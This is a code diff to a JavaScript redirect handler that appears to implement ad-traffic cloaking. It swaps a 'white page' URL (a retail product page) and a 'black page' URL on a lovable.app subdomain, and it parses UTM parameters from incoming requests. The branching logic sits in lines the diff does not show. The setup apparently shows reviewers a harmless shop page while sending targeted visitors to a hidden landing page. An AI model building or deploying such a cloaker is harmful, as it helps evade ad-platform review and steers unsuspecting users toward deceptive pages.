@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.scandinavian-lifestyle.com/Brands/Lapuan-Kankurit/Cushion-covers-Hot-water-bottles/Lapuan-Kankurit-Jaekaelae-lichen-hot-water-bottle-with-woollen-cover-oeko-tex-26155?c=6721";
-    const blackPageURL = "https://casssshlov.lovable.app";
+    const whitePageURL = "https://www.ikea.com/at/en/p/ekorre-rocking-moose-red-rubberwood-50060713/";
+    const blackPageURL = "https://wherlnquz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
